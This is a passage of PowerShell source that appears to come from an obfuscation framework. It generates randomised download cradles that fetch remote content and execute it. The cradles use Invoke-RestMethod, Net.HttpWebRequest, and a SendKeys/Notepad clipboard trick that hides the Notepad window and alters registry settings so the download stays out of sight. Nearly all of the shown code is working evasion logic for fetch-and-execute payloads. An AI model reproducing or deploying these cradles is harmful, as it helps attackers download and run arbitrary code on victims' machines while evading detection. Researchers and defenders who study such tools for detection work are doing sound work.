                        $CommandArray += $Invoke.Replace($InvokeTag,$SyntaxToInvoke).Replace($CommandTag,$Command).Replace($CommandEscapedStringTag,$CommandEscapedString)

                        If(!$Invoke.Contains($CommandTag) -AND !$Invoke.Contains($CommandEscapedStringTag))
                        {
                            If($Command) {$CommandArray += $Command}
                        }

                        # Set alternate command arrangement logic here.
                        $CommandArray2  = @()
                        $CommandArray2 += "$SetVar1'$Url'"

                        # Randomly choose between placing cmdlet before $Url or after it (via pipes).
                        If($SwitchRandom_01)
                        {
                            $SyntaxToInvoke = "($GetVar1|$ForEachRandom{($InvokeRestMethod $CurrentItemVariable)})"
                        }
                        Else
                        {
                            $SyntaxToInvoke = "($InvokeRestMethod $GetVar1)"
                        }

                        $ResponseVar = $SyntaxToInvoke
                          
                        $CommandArray2 += $Invoke.Replace($InvokeTag,$SyntaxToInvoke).Replace($CommandTag,$Command).Replace($CommandEscapedStringTag,$CommandEscapedString)

                        If(!$Invoke.Contains($CommandTag) -AND !$Invoke.Contains($CommandEscapedStringTag))
                        {
                            If($Command) {$CommandArray2 += $Command}
                        }

                        # Set command ordering arrangement logic here.
                        Switch($SwitchRandom_01)
                        {
                            1 {$Syntax = $CommandArray  -Join ';'}
                            2 {$Syntax = $CommandArray2 -Join ';'}
                        }
                          
                        # Remove .Invoke methods since this cradle is PS3.0+ and .Invoke is not needed in PS3.0+.
                        $Syntax = $Syntax.Replace('.Invoke()','<SCRIPTBLOCKINVOKETAG>').Replace('.Invoke(','(').Replace('.Invoke(','(').Replace('<SCRIPTBLOCKINVOKETAG>','.Invoke()')

                        Set-Variable $FinalVariableName $Syntax
                    }
                }
                3 {
                    # Syntax concatenate into logical variable count but random names with obfuscated variable GET/SET syntax.
                      
                    $VarOptionsIndex  = 1
                    $NumberOfVarNames = 2

                    # This array will keep track of all variables necessary in this block's final $CommandArray syntax.
                    $VarsUsedInThisBlock  = @()
                    $VarsUsedInThisBlock += Set-GetSetVariables $NumberOfVarNames $VarOptionsIndex
                      
                    # Set all new variables from above function to current variable context (from script-level to normal-level).
                    For($k=1; $k -le $NumberOfVarNames; $k++)
                    {
                        ForEach($VarName in @("SetVar$k","GetVar$k","SetVar$k`WithTags","GetVar$k`WithTags")) {Set-Variable $VarName (Get-Variable $VarName -Scope Script).Value}
                    }

                    # For all variables in $VarsUsedInThisBlock this For loop will set the appropriate VARNAME+'WithTags' values.
                    # It will also set the final $CradleSyntax and CradleSyntaxWithTags variables.
                    $VarsUsedInThisBlock += @('Invoke','Url','Command','CommandEscapedString','InvokeWebRequest')
                    For($i=1; $i -le 2; $i++)
                    {
                        $FinalVariableName = 'CradleSyntax'
                        If($i -eq 2)
                        {
                            $FinalVariableName = 'CradleSyntaxWithTags'
                            ForEach($Var in $VarsUsedInThisBlock) {Set-Variable $Var (Get-Variable ($Var + 'WithTags')).Value}
                        }
                          
                        # Set command arrangement logic here.
                        $CommandArray  = @()
                        $CommandArray += "$SetVar1'$Url'"

                        # Randomly choose between placing cmdlet before $Url or after it (via pipes).
                        If($SwitchRandom_01)
                        {
                            $Response = "($GetVar1|$ForEachRandom{($InvokeRestMethod $CurrentItemVariable)})"
                        }
                        Else
                        {
                            $Response = "($InvokeRestMethod $GetVar1)"
                        }

                        $CommandArray += "$SetVar2$Response"

                        $SyntaxToInvoke = "$GetVar2"
                          
                        $CommandArray += $Invoke.Replace($InvokeTag,$SyntaxToInvoke).Replace($CommandTag,$Command).Replace($CommandEscapedStringTag,$CommandEscapedString)

                        If(!$Invoke.Contains($CommandTag) -AND !$Invoke.Contains($CommandEscapedStringTag))
                        {
                            If($Command) {$CommandArray += $Command}
                        }

                        # Set alternate command arrangement logic here.
                        $CommandArray2  = @()
                        $CommandArray2 += "$SetVar1'$Url'"

                        # Randomly choose between placing cmdlet before $Url or after it (via pipes).
                        If($SwitchRandom_01)
                        {
                            $SyntaxToInvoke = "($GetVar1|$ForEachRandom{($InvokeRestMethod $CurrentItemVariable)})"
                        }
                        Else
                        {
                            $SyntaxToInvoke = "($InvokeRestMethod $GetVar1)"
                        }

                        $CommandArray2 += $Invoke.Replace($InvokeTag,$SyntaxToInvoke).Replace($CommandTag,$Command).Replace($CommandEscapedStringTag,$CommandEscapedString)

                        If(!$Invoke.Contains($CommandTag) -AND !$Invoke.Contains($CommandEscapedStringTag))
                        {
                            If($Command) {$CommandArray2 += $Command}
                        }

                        # Set command ordering arrangement logic here.
                        Switch($SwitchRandom_01)
                        {
                            1 {$Syntax = $CommandArray  -Join ';'}
                            2 {$Syntax = $CommandArray2 -Join ';'}
                        }
                          
                        # Remove .Invoke methods since this cradle is PS3.0+ and .Invoke is not needed in PS3.0+.
                        $Syntax = $Syntax.Replace('.Invoke()','<SCRIPTBLOCKINVOKETAG>').Replace('.Invoke(','(').Replace('.Invoke(','(').Replace('<SCRIPTBLOCKINVOKETAG>','.Invoke()')

                        Set-Variable $FinalVariableName $Syntax
                    }
                }
                default {Write-Error "An invalid `$Rearrange value ($Rearrange) was passed to switch block for Out-Cradle `$Cradle value ($Cradle)."; Exit}
            }

            # Add final cradle syntax (with and without tags) and update token value to $CradleSyntaxOptions to be returned if -ReturnAsArray Switch was specified.
            $CradleSyntaxOptions = @($CradleSyntax,$CradleSyntaxWithTags,$TokenValueUpdatedThisIteration)
        }
        9 {
            ##################################
            ## [Net.HttpWebRequest]::Create ##
            ##################################

            # Switch block for changing overall syntax arrangement depending on the level passed in with the REARRANGE option.
            # If last option in $TokenArray is ALL then we will choose the highest value for $Rearrange in the below block since each Cradle can have differing numbers of $Rearrange values.
            If($AllOptionSelected) {$Rearrange = 2}
            Switch($Rearrange)
            {
                1 {
                    # Set more logical variable names for this block.
                    $RandomVarName1 = 'wr'  # WebRequest
                    $RandomVarName2 = 'sr'  # StreamReader
                    $RandomVarName3 = 'res' # Result

                    $VarOptionsIndex  = 0
                    $NumberOfVarNames = 3

                    # This array will keep track of all variables necessary in this block's final $CommandArray syntax.
                    $VarsUsedInThisBlock  = @()
                    $VarsUsedInThisBlock += Set-GetSetVariables $NumberOfVarNames $VarOptionsIndex

                    # Set all new variables from above function to current variable context (from script-level to normal-level).
                    For($k=1; $k -le $NumberOfVarNames; $k++)
                    {
                        ForEach($VarName in @("SetVar$k","GetVar$k","SetVar$k`WithTags","GetVar$k`WithTags")) {Set-Variable $VarName (Get-Variable $VarName -Scope Script).Value}
                    }

                    # For all variables in $VarsUsedInThisBlock this For loop will set the appropriate VARNAME+'WithTags' values.
                    # It will also set the final $CradleSyntax and CradleSyntaxWithTags variables.
                    $VarsUsedInThisBlock += @('Invoke','Url','Command','CommandEscapedString','NetHttpWebRequest','Stream2')
                    For($i=1; $i -le 2; $i++)
                    {
                        $FinalVariableName = 'CradleSyntax'
                        If($i -eq 2)
                        {
                            $FinalVariableName = 'CradleSyntaxWithTags'
                            # Set each 'WithTags' variable values to non-'WithTags' variable names for simplicity.
                            ForEach($Var in $VarsUsedInThisBlock) {Set-Variable $Var (Get-Variable ($Var + 'WithTags')).Value}
                        }

                        # We have a slightly different $Stream syntax for this cradle. Renaming to generic $Stream variable for better readability of code.
                        $Stream = $Stream2

                        $Response = "$NetHttpWebRequest::Create('$Url').GetResponse().GetResponseStream()"

                        # Substitute appropriate tags for consistency across sub-components and differences in arrangements.
                        $Stream = $Stream.Replace($NetHttpWebRequestTag,$NetHttpWebRequest)
                        $Stream = $Stream.Replace($UrlTag,$Url)
                        $Stream = $Stream.Replace($ResponseTag,$Response)
                        $Stream = $Stream.Replace($SRSetVarTag,$SetVar2)
                        $Stream = $Stream.Replace($SRGetVarTag,$GetVar2)
                        $Stream = $Stream.Replace($ResultSetVarTag,$SetVar3)
                        $Stream = $Stream.Replace($ResultGetVarTag,$GetVar3)
                        $Stream = $Stream.Replace($WRGetVarTag,$GetVar1)

                        # Set command arrangement logic here.
                        $CommandArray  = @()

                        # SPECIAL CASE: If $Stream is a one-liner (no ';' in $Stream) then replace current $CommandArray with just the $Stream one-liner.
                        If(!$Stream.Contains(';'))
                        {
                            $SyntaxToInvoke = $Stream
                        }
                        ElseIf($Stream.Contains('While') -AND $Stream.Contains('Try') -AND $Stream.Contains('Catch'))
                        {
                            $CommandArray += "$SetVar1$Response"
                            $CommandArray += $Stream
                            $SyntaxToInvoke = $GetVar3
                        }
                        Else
                        {
                            # Default option.
                            $CommandArray += $Stream
                            $SyntaxToInvoke = $GetVar3
                        }

                        $CommandArray += $Invoke.Replace($InvokeTag,$SyntaxToInvoke).Replace($CommandTag,$Command).Replace($CommandEscapedStringTag,$CommandEscapedString)

                        If(!$Invoke.Contains($CommandTag) -AND !$Invoke.Contains($CommandEscapedStringTag))
                        {
                            If($Command) {$CommandArray += $Command}
                        }

                        $Syntax = ($CommandArray -Join ';')

                        Set-Variable $FinalVariableName $Syntax
                    }
                }
                2 {
                    # Syntax concatenate into logical variable count but random names with obfuscated variable GET/SET syntax.

                    $VarOptionsIndex  = 1
                    $NumberOfVarNames = 3

                    # This array will keep track of all variables necessary in this block's final $CommandArray syntax.
                    $VarsUsedInThisBlock  = @()
                    $VarsUsedInThisBlock += Set-GetSetVariables $NumberOfVarNames $VarOptionsIndex

                    # Set all new variables from above function to current variable context (from script-level to normal-level).
                    For($k=1; $k -le $NumberOfVarNames; $k++)
                    {
                        ForEach($VarName in @("SetVar$k","GetVar$k","SetVar$k`WithTags","GetVar$k`WithTags")) {Set-Variable $VarName (Get-Variable $VarName -Scope Script).Value}
                    }
                      
                    # Since we may have += syntax if Stream option 3 is chosen, we keep getting randomized GET/SET variable syntax until $GetVar3 is an acceptable syntax.
                    # (Get-Variable VARNAME).Value+= is acceptable, but errors occur when the syntax is (Get-Variable VARNAME -ValueOnly)+=
                    Do
                    {
                        # This array will keep track of all variables necessary in this block's final $CommandArray syntax.
                        $VarsUsedInThisBlock  = @()
                        $VarsUsedInThisBlock += Set-GetSetVariables $NumberOfVarNames $VarOptionsIndex

                        # Set all new variables from above function to current variable context (from script-level to normal-level).
                        For($k=1; $k -le $NumberOfVarNames; $k++)
                        {
                            ForEach($VarName in @("SetVar$k","GetVar$k","SetVar$k`WithTags","GetVar$k`WithTags")) {Set-Variable $VarName (Get-Variable $VarName -Scope Script).Value}
                        }
                    }
                    Until(!$GetVar3.Contains(' -V'))
                      
                    # For all variables in $VarsUsedInThisBlock this For loop will set the appropriate VARNAME+'WithTags' values.
                    # It will also set the final $CradleSyntax and CradleSyntaxWithTags variables.
                    $VarsUsedInThisBlock += @('Invoke','Url','Command','CommandEscapedString','NetHttpWebRequest','Stream2')
                    For($i=1; $i -le 2; $i++)
                    {
                        $FinalVariableName = 'CradleSyntax'
                        If($i -eq 2)
                        {
                            $FinalVariableName = 'CradleSyntaxWithTags'
                            # Set each 'WithTags' variable values to non-'WithTags' variable names for simplicity.
                            ForEach($Var in $VarsUsedInThisBlock) {Set-Variable $Var (Get-Variable ($Var + 'WithTags')).Value}
                        }

                        # We have a slightly different $Stream syntax for this cradle. Renaming to generic $Stream variable for better readability of code.
                        $Stream = $Stream2

                        $Response = "$NetHttpWebRequest::Create('$Url').GetResponse().GetResponseStream()"

                        # Substitute appropriate tags for consistency across sub-components and differences in arrangements.
                        $Stream = $Stream.Replace($NetHttpWebRequestTag,$NetHttpWebRequest)
                        $Stream = $Stream.Replace($UrlTag,$Url)
                        If($SetVar2.Contains(' '))
                        {
                            # Add extra parenthese for SetVar2 if it is a Set-Variable syntax (i.e. with whitespaces).
                            $Stream = $Stream.Replace($ResponseTag,($Response + ')'))
                            $Stream = $Stream.Replace($SRSetVarTag,($SetVar2 + '('))
                        }
                        Else
                        {
                            $Stream = $Stream.Replace($ResponseTag,$Response)
                            $Stream = $Stream.Replace($SRSetVarTag,$SetVar2)
                        }
                        $Stream = $Stream.Replace($SRGetVarTag,$GetVar2)
                        $Stream = $Stream.Replace($ResultSetVarTag,$SetVar3)
                        $Stream = $Stream.Replace($ResultGetVarTag,$GetVar3)
                        $Stream = $Stream.Replace($WRGetVarTag,$GetVar1)

                        # Set command arrangement logic here.
                        $CommandArray  = @()

                        # SPECIAL CASE: If $Stream is a one-liner (no ';' in $Stream) then replace current $CommandArray with just the $Stream one-liner.
                        If(!$Stream.Contains(';'))
                        {
                            $SyntaxToInvoke = $Stream
                        }
                        ElseIf($Stream.Contains('While') -AND $Stream.Contains('Try') -AND $Stream.Contains('Catch'))
                        {
                            $CommandArray += "$SetVar1($Response)"
                            $CommandArray += $Stream
                            $SyntaxToInvoke = $GetVar3
                        }
                        Else
                        {
                            # Default option.
                            $CommandArray += $Stream
                            $SyntaxToInvoke = $GetVar3
                        }

                        $CommandArray += $Invoke.Replace($InvokeTag,$SyntaxToInvoke).Replace($CommandTag,$Command).Replace($CommandEscapedStringTag,$CommandEscapedString)

                        If(!$Invoke.Contains($CommandTag) -AND !$Invoke.Contains($CommandEscapedStringTag))
                        {
                            If($Command) {$CommandArray += $Command}
                        }

                        $Syntax = ($CommandArray -Join ';')

                        Set-Variable $FinalVariableName $Syntax
                    }
                }
                default {Write-Error "An invalid `$Rearrange value ($Rearrange) was passed to switch block for Out-Cradle `$Cradle value ($Cradle)."; Exit}
            }

            # Add final cradle syntax (with and without tags) and update token value to $CradleSyntaxOptions to be returned if -ReturnAsArray Switch was specified.
            $CradleSyntaxOptions = @($CradleSyntax,$CradleSyntaxWithTags,$TokenValueUpdatedThisIteration)
        }
        10 {
            ###############################################################
            ## PsSendKeys (New-Object -ComObject WScript.Shell).SendKeys ##
            ###############################################################

            # Switch block for changing overall syntax arrangement depending on the level passed in with the REARRANGE option.
            # If last option in $TokenArray is ALL then we will choose the highest value for $Rearrange in the below block since each Cradle can have differing numbers of $Rearrange values.
            If($AllOptionSelected) {$Rearrange = 2}
            Switch($Rearrange)
            {
                1 {
                    # Syntax concatenate into logical variable count and names with default variable GET/SET syntax.
                      
                    # Set more logical variable names for this block.
                    $RandomVarName1 = 'url'    # Url
                    $RandomVarName2 = 'app'    # Application
                    $RandomVarName3 = 'title'  # Application Title
                    $RandomVarName4 = 'wshell' # WScript.Shell
                    $RandomVarName5 = 'props'  # Properties of Application Display
                    $RandomVarName6 = 'res'    # Result from Clipboard
                    $RandomVarName7 = 'curpid' # Current PID for Application
                    $RandomVarName8 = 'reg'    # Registry Path for Notepad Application Properties
                          
                    $VarOptionsIndex  = 0
                    $NumberOfVarNames = 8

                    # This array will keep track of all variables necessary in this block's final $CommandArray syntax.
                    $VarsUsedInThisBlock  = @()
                    $VarsUsedInThisBlock += Set-GetSetVariables $NumberOfVarNames $VarOptionsIndex
                      
                    # Set all new variables from above function to current variable context (from script-level to normal-level).
                    For($k=1; $k -le $NumberOfVarNames; $k++)
                    {
                        ForEach($VarName in @("SetVar$k","GetVar$k","SetVar$k`WithTags","GetVar$k`WithTags")) {Set-Variable $VarName (Get-Variable $VarName -Scope Script).Value}
                    }

                    # These boolean variables are used to avoid redundant commands to force module auto-loading in PS3.0+.
                    $HasModuleAutoLoadCommand         = $FALSE
                    $HasModuleAutoLoadCommandWithTags = $FALSE

                    # There are reasons that you may rather call Notepad.exe or even C:\Windows\System32\Notepad.exe.
                    # These scenarios are interesting opportunities for defenders.
                    # Hopefully I will be sharing more information about this in the near future.
                    $SendKeysApp   = 'Notepad'
    
                    # For all variables in $VarsUsedInThisBlock this For loop will set the appropriate VARNAME+'WithTags' values.
                    # It will also set the final $CradleSyntax and CradleSyntaxWithTags variables.
                    $VarsUsedInThisBlock += @('Invoke','Url','Command','CommandEscapedString','NewObject','SleepMilliseconds','ComObjectFlag','ReflectionAssembly','IWindowPosX','IWindowPosY','IWindowPosDX','IWindowPosDY','StatusBar','GetItemProperty','SetItemProperty','LoadWithPartialName','HasModuleAutoLoadCommand','Exec','AppActivate','SendKeys','GetText')
                    For($i=1; $i -le 2; $i++)
                    {
                        $FinalVariableName = 'CradleSyntax'
                        If($i -eq 2)
                        {
                            $FinalVariableName = 'CradleSyntaxWithTags'
                            ForEach($Var in $VarsUsedInThisBlock) {Set-Variable $Var (Get-Variable ($Var + 'WithTags')).Value}
                        }

                        # Substitute appropriate tags for consistency across sub-components and differences in arrangements.
                        $iWindowPosDX = $iWindowPosDX.Replace($GetItemPropertyTag,$GetItemProperty.Replace($ModuleAutoLoadTag,''))
                        $iWindowPosDY = $iWindowPosDY.Replace($GetItemPropertyTag,$GetItemProperty.Replace($ModuleAutoLoadTag,''))
                        $iWindowPosX  =  $iWindowPosX.Replace($GetItemPropertyTag,$GetItemProperty.Replace($ModuleAutoLoadTag,''))
                        $iWindowPosY  =  $iWindowPosY.Replace($GetItemPropertyTag,$GetItemProperty.Replace($ModuleAutoLoadTag,''))
                        $StatusBar    =    $StatusBar.Replace($GetItemPropertyTag,$GetItemProperty.Replace($ModuleAutoLoadTag,''))
                        $AppActivate  =  $AppActivate.Replace($WScriptShellTag,$GetVar4)
                        $SendKeys     =     $SendKeys.Replace($WScriptShellTag,$GetVar4)
                        $GetText      =      $GetText.Replace($WindowsFormsClipboardTag,"[$WindowsFormsClipboard]")
                        $Exec         =         $Exec.Replace($WScriptShellTag,$GetVar4)
                          
                        # Set command arrangement logic here.
                        $CommandArray  = @()
                        $CommandArray += "$SetVar1'$Url'"
                        $CommandArray += "$SetVar2'$SendKeysApp'"
                        $CommandArray += "$SetVar8'HKCU:\Software\Microsoft\Notepad'"

                        If(!$HasModuleAutoLoadCommand -AND $NewObject.Contains($ModuleAutoLoadTag))
                        {
                            $CurrentModuleAutoLoadRandom = $ModuleAutoLoadRandom
                            If($NewObject.EndsWith('0>>>'))
                            {
                                $CurrentModuleAutoLoadRandom = '<<<0' + $CurrentModuleAutoLoadRandom + '0>>>'
                            }
                            $HasModuleAutoLoadCommand = $TRUE
                        }
                        Else
                        {
                            $CurrentModuleAutoLoadRandom = ''
                        }
                        $NewObject = $NewObject.Replace($ModuleAutoLoadTag,'')
                        $CommandArray += $CurrentModuleAutoLoadRandom + "$SetVar4$NewObject$ComObjectFlag WScript.Shell"

                        If(!$HasModuleAutoLoadCommand -AND $GetItemProperty.Contains($ModuleAutoLoadTag))
                        {
                            $CurrentModuleAutoLoadRandom = $ModuleAutoLoadRandom
                            If($GetItemProperty.EndsWith('0>>>'))
                            {
                                $CurrentModuleAutoLoadRandom = '<<<0' + $CurrentModuleAutoLoadRandom + '0>>>'
                            }
                            $HasModuleAutoLoadCommand = $TRUE
                        }
                        Else
                        {
                            $CurrentModuleAutoLoadRandom = ''
                        }
                        $GetItemProperty = $GetItemProperty.Replace($ModuleAutoLoadTag,'')
                        $CommandArray += $CurrentModuleAutoLoadRandom + "$SetVar5($GetItemProperty$GetVar8)"

                        $CommandArray += ("$ReflectionAssembly::" + $LoadWithPartialName.Replace($ReflectionAssemblyTag,$ReflectionAssembly.Replace('[Void]','').Replace('$Null=','')) + "('System.Windows.Forms')")

                        If(!$HasModuleAutoLoadCommand -AND $SetItemProperty.Contains($ModuleAutoLoadTag))
                        {
                            $CurrentModuleAutoLoadRandom = $ModuleAutoLoadRandom
                            If($SetItemProperty.EndsWith('0>>>'))
                            {
                                $CurrentModuleAutoLoadRandom = '<<<0' + $CurrentModuleAutoLoadRandom + '0>>>'
                            }
                            $HasModuleAutoLoadCommand = $TRUE
                        }
                        Else
                        {
                            $CurrentModuleAutoLoadRandom = ''
                        }
                        $SetItemProperty = $SetItemProperty.Replace($ModuleAutoLoadTag,'')

                        # Set Notepad's properties (namely sizing and status bar configurations) to reduce visibility and potential noise.
                        # Randomize the order of these properties.
                        $SetItemListTemp = @(@("'$StatusBar'",0),@("'$iWindowPosY'","([String]($WindowsFormsScreen::AllScreens)).$ScreenHeight"))
                        $SetItemList = @()
                        ForEach($Index in $SetItemListIndex_01)
                        {
                            $SetItemList += , $SetItemListTemp[$Index]
                        }

                        # Randomly decide between piped and not-piped syntax for multiple contiguous Set-ItemProperty commands.
                        $SetItemSyntax = ''
                        If($SwitchRandom_01 -eq 0)
                        {
                            ForEach($SetItemArray in $SetItemList)
                            {
                                $SetItemPropName  = $SetItemArray[0]
                                $SetItemPropValue = $SetItemArray[1]

                                # Remove single quotes from $SetItemPropName for all usages in this If block.
                                $SetItemPropName = $SetItemPropName.Trim("'")

                                $SetItemSyntax += "$SetItemProperty$GetVar8 $SetItemPropName $SetItemPropValue;"
                            }
                            $SetItemSyntax = $SetItemSyntax.Trim(';')
                        }
                        Else
                        {
                            $SetItemPropNameTrimmed = @()
                            ForEach($SetItemArray in $SetItemList)
                            {
                                $SetItemPropName  = $SetItemArray[0]
                                $SetItemPropValue = $SetItemArray[1]

                                # Trim off single quotes for variables.
                                If($SetItemPropName.Contains('('))
                                {
                                    $SetItemPropName = $SetItemPropName.Trim("'")
                                }
                                      
                                $SetItemPropNameTrimmed += "@($SetItemPropName,$SetItemPropValue)"
                            }
                              
                            $SetItemSyntax = "@(" + ($SetItemPropNameTrimmed -Join ',') + ")|$ForEachRandom{$SetItemProperty$GetVar8 $CurrentItemVariable[0] $CurrentItemVariable2[1]}"
                        }
                        $CommandArray += $SetItemSyntax

                        # Since 'Notepad - Untitled' application title is language specific (and we need this to perform AppActivate checks for higher reliability on slower systems), we will query MainWindowTitle from Notepad instance that we launch.
                        # This will also reduce the likelihood of errors if additional Notepad windows are already present.
                        $CommandArray += "$SetVar7$GetVar4.$Exec($GetVar2).ProcessID"
                        $CommandArray += "While(!($SetVar3$GetProcessRandom|$WhereObjectRandom{$CurrentItemVariable.id$EqualFlagRandom$GetVar7}|$ForEachRandom{$CurrentItemVariable2.MainWindowTitle})){$SleepMilliseconds}"
                        $CommandArray += "While(!$GetVar4.$AppActivate($GetVar3)){$SleepMilliseconds}"
                          
                        # The below ^o (Open) shortcut does not appear to be language dependent.
                        # If there are scenarios in which it is then we can switch to: '%','{ENTER}','{DOWN}','{ENTER}'
                        $CommandArray += "$GetVar4.$SendKeys('^o')"
                        $CommandArray += $SleepMilliseconds
                          
                        # Randomly decide between piped and not-piped syntax for multiple contiguous SendKeys commands.
                        $SendKeysList = @($GetVar1,"(' '*1000)","'$SendKeysEnter'")
                        $SendKeysSyntax = ''
                        If($SwitchRandom_01 -eq 0)
                        {
                            ForEach($SendKey in $SendKeysList)
                            {
                                $SendKeysSyntax += "$GetVar4.$SendKeys($SendKey);"
                            }
                            $SendKeysSyntax = $SendKeysSyntax.Trim(';')
                        }
                        Else
                        {
                            $SendKeysSyntax = "@(" + ($SendKeysList -Join ',') + ")|$ForEachRandom{$GetVar4.$SendKeys($CurrentItemVariable2)}"
                        }
                        $CommandArray += $SendKeysSyntax
                        $CommandArray += "$SetVar6`$Null"
                          
                        # Randomly decide between piped and not-piped syntax for multiple contiguous SendKeys commands.
                        $SendKeysList = @("'^a'","'^c'")
                        $SendKeysSyntax = ''
                        If($SwitchRandom_01 -eq 0)
                        {
                            ForEach($SendKey in $SendKeysList)
                            {
                                $SendKeysSyntax += "$GetVar4.$SendKeys($SendKey);"
                            }
                            $SendKeysSyntax = $SendKeysSyntax.Trim(';')
                        }
                        Else
                        {
                            $SendKeysSyntax = "@(" + ($SendKeysList -Join ',') + ")|$ForEachRandom{$GetVar4.$SendKeys($CurrentItemVariable)}"
                        }
                        $CommandArray += "While($GetVar6.Length$LessThanTwoRandom){[$WindowsFormsClipboard]::$ClearClipboard;$SendKeysSyntax;$SleepMilliseconds;$SetVar6([$WindowsFormsClipboard]::$GetText)}"
                        $CommandArray += "[$WindowsFormsClipboard]::$ClearClipboard"

                        # Randomly decide between piped and not-piped syntax for multiple contiguous SendKeys commands.
                        $SendKeysList = @("'%f'","'x'")
                        $SendKeysSyntax = ''
                        If($SwitchRandom_01 -eq 0)
                        {
                            ForEach($SendKey in $SendKeysList)
                            {
                                $SendKeysSyntax += "$GetVar4.$SendKeys($SendKey);"
                            }
                            $SendKeysSyntax = $SendKeysSyntax.Trim(';')
                        }
                        Else
                        {
                            $SendKeysSyntax = "@(" + ($SendKeysList -Join ',') + ")|$ForEachRandom{$GetVar4.$SendKeys($CurrentItemVariable2)}"
                        }
                        $CommandArray += $SendKeysSyntax

                        # Randomly decide between piped and not-piped syntax for multiple contiguous SendKeys commands.
                        $SendKeysList = @("'{TAB}'","'$SendKeysEnter'")
                        $SendKeysSyntax = ''
                        If($SwitchRandom_01 -eq 0)
                        {
                            ForEach($SendKey in $SendKeysList)
                            {
                                $SendKeysSyntax += "$GetVar4.$SendKeys($SendKey);"
                            }
                            $SendKeysSyntax = $SendKeysSyntax.Trim(';')
                        }
                        Else
                        {
                            $SendKeysSyntax = "@(" + ($SendKeysList -Join ',') + ")|$ForEachRandom{$GetVar4.$SendKeys($CurrentItemVariable)}"
                        }
                        $CommandArray += "If($GetProcessRandom|$WhereObjectRandom{$CurrentItemVariable.id$EqualFlagRandom$GetVar7}){$SendKeysSyntax}"

                        # Set Notepad's properties (namely sizing and status bar configurations) back to pre-download state stored in propertiy variable ($GetVar5).
                        # Randomize the order of these properties.
                        $SetItemListTemp = @("'$iWindowPosDX'","'$iWindowPosDY'","'$iWindowPosX'","'$iWindowPosY'","'$StatusBar'")
                        $SetItemList = @()
                        ForEach($Index in $SetItemListIndex_012345)
                        {
                            $SetItemList += $SetItemListTemp[$Index]
                        }
                          
                        # Randomly decide between piped and not-piped syntax for multiple contiguous Set-ItemProperty commands.
                        $SetItemSyntax = ''
                        If($SwitchRandom_01 -eq 0)
                        {
                            ForEach($SetItemPropName in $SetItemList)
                            {
                                # Remove single quotes from $SetItemPropName for all usages in this If block.
                                $SetItemPropName = $SetItemPropName.Trim("'")

                                # Encapsulate with parentheses for $SetItemPropName2 if it ends with .Value.
                                $SetItemPropName2 = $SetItemPropName
                                If($SetItemPropName2.EndsWith(').Value'))
                                {
                                    $SetItemPropName2 = "($SetItemPropName2)"
                                }
                                  
                                $SetItemSyntax += "$SetItemProperty$GetVar8 $SetItemPropName $GetVar5.$SetItemPropName2;"
                            }
                            $SetItemSyntax = $SetItemSyntax.Trim(';')
                        }
                        Else
                        {
                            $SetItemPropNameTrimmed = @()
                            ForEach($SetItemPropName in $SetItemList)
                            {
                                # Trim off single quotes for variables.
                                If($SetItemPropName.Contains('('))
                                {
                                    $SetItemPropName = $SetItemPropName.Trim("'")
                                }

                                $SetItemPropNameTrimmed += $SetItemPropName
                            }
                              
                            # Encapsulate with parentheses for $CurrentItemVariable2ForSetItemSyntax if it ends with .Value.
                            $CurrentItemVariable2ForSetItemSyntax = $CurrentItemVariable2
                            If($CurrentItemVariable2ForSetItemSyntax.EndsWith(').Value'))
                            {
                                $CurrentItemVariable2ForSetItemSyntax = "($CurrentItemVariable2ForSetItemSyntax)"
                            }

                            $SetItemSyntax = "@(" + ($SetItemPropNameTrimmed -Join ',') + ")|$ForEachRandom{$SetItemProperty$GetVar8 $CurrentItemVariable $GetVar5.$CurrentItemVariable2ForSetItemSyntax}"
                        }
                        $CommandArray += $SetItemSyntax

                        $SyntaxToInvoke = $GetVar6

                        # Substitute appropriate tags for consistency across sub-components and differences in arrangements.

                        $CommandArray += $Invoke.Replace($InvokeTag,$SyntaxToInvoke).Replace($CommandTag,$Command).Replace($CommandEscapedStringTag,$CommandEscapedString)

                        If(!$Invoke.Contains($CommandTag) -AND !$Invoke.Contains($CommandEscapedStringTag))
                        {
                            If($Command) {$CommandArray += $Command}
                        }

                        # Set command ordering arrangement logic here.
                        $Syntax = ($CommandArray[$ArrayIndexOrder_0123] + $CommandArray[$ArrayIndexOrder_45] + $CommandArray[6..$CommandArray.Length])  -Join ';'

                        Set-Variable $FinalVariableName $Syntax
                    }
                }
                2 {
                    # Syntax concatenate into logical variable count but random names with obfuscated variable GET/SET syntax.

                    $VarOptionsIndex  = 1
                    $NumberOfVarNames = 8

                    # This array will keep track of all variables necessary in this block's final $CommandArray syntax.
                    $VarsUsedInThisBlock  = @()
                    $VarsUsedInThisBlock += Set-GetSetVariables $NumberOfVarNames $VarOptionsIndex
                      
                    # Set all new variables from above function to current variable context (from script-level to normal-level).
                    For($k=1; $k -le $NumberOfVarNames; $k++)
                    {
                        ForEach($VarName in @("SetVar$k","GetVar$k","SetVar$k`WithTags","GetVar$k`WithTags")) {Set-Variable $VarName (Get-Variable $VarName -Scope Script).Value}
                    }

                    # These boolean variables are used to avoid redundant commands to force module auto-loading in PS3.0+.
                    $HasModuleAutoLoadCommand         = $FALSE
                    $HasModuleAutoLoadCommandWithTags = $FALSE

                    # There are reasons that you may rather call Notepad.exe or even C:\Windows\System32\Notepad.exe.
                    # These scenarios are interesting opportunities for defenders.
                    # Hopefully I will be sharing more information about this in the near future.
                    $SendKeysApp   = 'Notepad'
    
                    # For all variables in $VarsUsedInThisBlock this For loop will set the appropriate VARNAME+'WithTags' values.
                    # It will also set the final $CradleSyntax and CradleSyntaxWithTags variables.
                    $VarsUsedInThisBlock += @('Invoke','Url','Command','CommandEscapedString','NewObject','SleepMilliseconds','ComObjectFlag','ReflectionAssembly','IWindowPosX','IWindowPosY','IWindowPosDX','IWindowPosDY','StatusBar','GetItemProperty','SetItemProperty','LoadWithPartialName','HasModuleAutoLoadCommand','Exec','AppActivate','SendKeys','GetText')
                    For($i=1; $i -le 2; $i++)
                    {
                        $FinalVariableName = 'CradleSyntax'
                        If($i -eq 2)
                        {
                            $FinalVariableName = 'CradleSyntaxWithTags'
                            ForEach($Var in $VarsUsedInThisBlock) {Set-Variable $Var (Get-Variable ($Var + 'WithTags')).Value}
                        }

                        # Substitute appropriate tags for consistency across sub-components and differences in arrangements.
                        $iWindowPosDX = $iWindowPosDX.Replace($GetItemPropertyTag,$GetItemProperty.Replace($ModuleAutoLoadTag,''))
                        $iWindowPosDY = $iWindowPosDY.Replace($GetItemPropertyTag,$GetItemProperty.Replace($ModuleAutoLoadTag,''))
